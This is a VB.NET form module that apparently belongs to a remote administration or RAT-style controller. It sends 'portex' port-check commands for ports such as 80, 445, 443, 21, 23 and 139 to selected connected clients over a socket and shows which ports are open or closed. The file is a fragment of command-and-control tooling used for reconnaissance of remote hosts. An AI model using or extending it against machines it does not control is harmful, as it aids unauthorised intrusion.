Imports System.Runtime.InteropServices

Public Class Form26
    Public xxx As Integer
    <DllImport("uxtheme", CharSet:=CharSet.Unicode)>
    Public Shared Function SetWindowTheme(ByVal hWnd As IntPtr, ByVal textSubAppName As String, ByVal textSubIdList As String) As Integer
    End Function
    Private Sub Form26_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        SetWindowTheme(ListView1.Handle, "explorer", Nothing)
        ComboBox1.Items.AddRange(New Object() {Form1.L1.Items.Item(Form1.L1.FocusedItem.Index).SubItems.Item(13).Text})
        ComboBox1.Items.AddRange(New Object() {Form1.L1.Items.Item(Form1.L1.FocusedItem.Index).SubItems.Item(1).Text})

    End Sub

   

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        For Each Process As ListViewItem In ListView1.Items


            If Process.Text.Contains("Port [Open]") Then
                Process.ImageIndex = 1
                'Process.BackColor = Color.LightGreen
            ElseIf Process.Text.Contains("Port [Closed]") Then
                Process.ImageIndex = 0
                'Process.BackColor = Color.IndianRed

            End If

        Next










    End Sub


    Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged

    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick

        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "portex" & "|U|" & "127.0.0.1" & "|U|" & "80")
        Next
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "portex" & "|U|" & "127.0.0.1" & "|U|" & "445")
        Next
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "portex" & "|U|" & "127.0.0.1" & "|U|" & "443")
        Next
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "portex" & "|U|" & "127.0.0.1" & "|U|" & Form2.NumericUpDown1.Value.ToString)
        Next
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "portex" & "|U|" & "127.0.0.1" & "|U|" & "21")
        Next
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "portex" & "|U|" & "127.0.0.1" & "|U|" & "23")
        Next
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "portex" & "|U|" & "127.0.0.1" & "|U|" & "139")
        Next
        Timer2.Enabled = False
    End Sub

    Private Sub AvButton1_Click(sender As Object, e As EventArgs) Handles AvButton1.Click


        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "portex" & "|U|" & ComboBox1.Text & "|U|" & TextBox1.Text)
        Next

    End Sub
End Class